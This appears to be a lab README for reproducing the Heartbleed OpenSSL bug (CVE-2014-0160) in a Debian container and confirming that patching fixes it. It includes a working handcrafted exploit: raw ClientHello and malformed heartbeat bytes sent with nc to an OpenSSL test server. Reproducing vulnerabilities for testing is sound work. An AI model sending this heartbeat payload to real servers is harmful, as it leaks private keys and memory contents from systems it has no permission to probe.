# CVE-2014-0160 (Heartbleed)

### Description
The (1) TLS and (2) DTLS implementations in OpenSSL 1.0.1 before 1.0.1g do not properly handle Heartbeat Extension packets, which allows remote attackers to obtain sensitive information from process memory via crafted packets that trigger a buffer over-read, as demonstrated by reading private keys, related to d1_both.c and t1_lib.c, aka the Heartbleed bug.


### Command to run
```shell
python cve_debian.py -n 2014-0160 -v bullseye -d heartbleed -s --port 4443
```

### Simple testing method
In the container :
```shell
openssl req -x509 -newkey rsa:2048 -out cert.pem -keyout key.pem -keyform PEM -outform PEM -nodes
openssl s_server -cert cert.pem -key key.pem
```
Then, on the host : 
```shell
( printf "\x16\x03\x01\x00\x38\x01\x00\x00\x34\x03\x01"
printf "\x00\x00\x00\x00\x00\x00\x00\x00" # Random
printf "\x00\x00\x00\x00\x00\x00\x00\x00" # Random
printf "\x00\x00\x00\x00\x00\x00\x00\x00" # Random
printf "\x00\x00\x00\x00\x00\x00\x00\x00" # Random
printf "\x00\x00\x06\x00\x05\x00\x35\x00\x39\x01\x00"
printf "\x00\x05\x00\x0f\x00\x01\x01" ) > chello.bin

printf "\x18\x03\x01\x00\x03\x01\xff\xff" > hb.bin

(cat chello.bin; sleep 3; cat hb.bin) | nc CONTAINER_IP_ADDRESS 4433 | hexdump -C
```
The default IP address should be 172.17.0.2 .  
We observe that a lot of data thus it is vulnerable. 

If openssl is then updated in the container : 
```shell
apt-get install openssl
```
And the exploit is tested again, only a few bytes are sent back. The vulnerability is fixed.